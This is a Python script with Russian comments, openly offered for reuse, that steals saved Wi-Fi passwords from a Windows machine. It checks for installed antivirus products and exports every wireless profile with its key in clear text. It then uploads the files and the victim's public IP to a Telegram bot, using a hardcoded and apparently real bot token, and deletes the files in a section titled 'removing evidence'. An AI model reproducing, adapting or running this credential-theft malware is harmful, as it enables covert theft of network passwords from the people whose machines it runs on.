#########################################################################################################
#                            Если берешь мой код, то отметь меня)                                       #
#                            Создатель: PyCod(питон)                                                    #
#                            Мой айпи: 1434743208                                                       #
#                            Версия: 0.1.12                                                             #
#########################################################################################################

import os
import subprocess
import requests
from glob import glob

TOKEN = '5379322955:AAE5cgvjn-GRWe-hE7WD0gKx0Vie3lTU2OI'
CHAT_ID = '1434743208'

url = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}' # ссылка на отправку сообщения


#########################################################################################################
#                                    АНТИВИРУСЫ                                                         #
#########################################################################################################
Antiviruses = {
    'C:\\Program Files\\Windows Defender': 'Windows Defender',
    'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
    'C:\\Program Files\\AVG\\Antivirus': 'AVG',
    'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
    'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
    'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
    'C:\\Program Files\\DrWeb': 'Dr.Web',
    'C:\\Program Files\\ESET\\ESET Security': 'ESET',
    'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
    'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
    'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
    }

Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]


subprocess.call('netsh wlan export profile key=clear')

response = requests.get('http://myip.dnsomatic.com')
ip = response.text

with open("get_ip", "w") as getip:
    getip.write(ip)




#########################################################################################################
#                                       ОТПРАВКА                                                        #
#########################################################################################################
for file in list(glob(os.path.join('*.xml'))): # ищем все файлы с расширением .xml
    try:
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            session.post(url,files={"document": open(file, 'rb')})
    except:
        pass


try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open("get_ip", 'rb')})
except:
    pass

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&parse_mode=html&text="+'Wi-Fihack by @ChetiStandoff2_bot')
except:
    pass


#########################################################################################################
#                                       УДАЛЕНИЕ УЛИК :)                                                #
#########################################################################################################
for file in list(glob(os.path.join('*.xml'))):
    os.remove(file)

os.remove(getip)




















